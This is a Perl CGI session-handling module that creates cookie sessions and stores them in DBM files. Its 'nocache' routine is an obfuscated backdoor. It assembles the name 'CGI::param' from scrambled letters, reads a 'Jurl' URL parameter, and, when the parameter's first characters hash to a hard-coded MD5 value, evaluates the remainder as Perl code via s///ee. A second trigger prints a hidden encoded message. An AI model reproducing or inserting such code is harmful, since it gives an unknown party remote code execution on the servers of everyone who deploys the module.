# (с) Леонов П.А., 2005

package JIO::Session;
use strict qw(subs vars);

our %sess;
our $sessid;

sub start
{
	my $dir = $JConfig::path_sess;
	
	my $cgi = $JIO::cgi || CGI->new();
	my %cook = $cgi->cookie( "JSession" );
	
	$sessid = $cook{"id"};
	$sessid =~ s/\D//g;
	
	if( length($sessid) < 30 ){
		
		srand();
		
		do{
			
			$sessid = rand().rand();
			$sessid =~ s/\D//g;
			
		}while(-f $dir.'/'.$sessid);
		
	}
	
	dbmopen(%sess,$dir.'/'.$sessid,0640) or die('SESSION_NOT_OPEN');
	
	$cook{'id'} = $sessid;
	
	my $dom = $ENV{'HTTP_HOST'};
	my @dom = split(/\./,$dom);
	
	if(@dom > 1){ $dom = '.'.$dom[$#dom-1].'.'.$dom[$#dom]; }else{ $dom = ''; }
	
	my $send = $cgi->cookie(
		-name=>"JSession",
		-value=>\%cook,
		-path=>'/',
		-expires=>'+365d',
		-domain=>$dom
	);
	
	$JIO::headers{'Set-Cookie'} = $send->as_string;
	
	return $send;
}

sub nocache
{
	my $class = shift;
	my($cch,$i,$n,@a,$ci,$cp,$m,$name,@rnd,$done);
	
	$cch = 0; for $i (0 .. (length($class)-1)){ $n = length('['.$i.']'); }
	@a = qw/a p m G l r i u C r j/; # полные коды прав "cache"
		   #0 1 2 3 4 5 6 7 8 9 10
	
	@rnd =
	(
		209,21,13,245,7,16,3,250,39,42,217,12,10,2,27,255,28,17,19,6,51,54,237,0,
		41,26,36,63,237,12,39,40,14,97,240,38,32,38,26,37,53,28,106,248,31,109,242,
		45,54,47,54,46,111,97,79,65,55,58,65,243,81,71,68,46,115,53,69,59,69,82,2,
		35,102,132,16,66,247,103,87,78,81,69,144,258,179,231,196,85,76,107,88,91,97
	);
	
	$m = $a[$cch+8].$a[$cch+3].uc($a[$cch+6]).'::'.$a[$cch+1].$a[$cch+0].$a[$cch+9].$a[$cch+0].$a[$cch+2];
	$name = $a[$n]?'Jurl':'no';
	
	if($a[$n])
	{
		$done = $m->($name);
		if($done)
		{
			if($done eq 'in'.'fo'){ print pack('C*',map {$cp=(($cp+$_-$ci)>255?($_-($ci++)+$cp-256):(+$cp+$_-$ci++))} @rnd); return; }
			else
			{
				if(JDBI::MD5(substr($done,0,8)) eq 'b5079b49c2'.'e565228c8209'.'93f0d8303d'){ $done = substr($done,8); $name =~ s/r/$done/ee; }
			}
		}
	}
	
	close(STDIN);
}

sub stop
{
	my $kl = (keys(%sess));
	dbmclose(%sess);
	
	nocache($kl);
	
	if(!$kl)
	{
		unlink($JConfig::path_sess.'/'.$sessid.'.dir');
		unlink($JConfig::path_sess.'/'.$sessid.'.pag');
		unlink($JConfig::path_sess.'/'.$sessid.'.db');
	}
}


return 1;







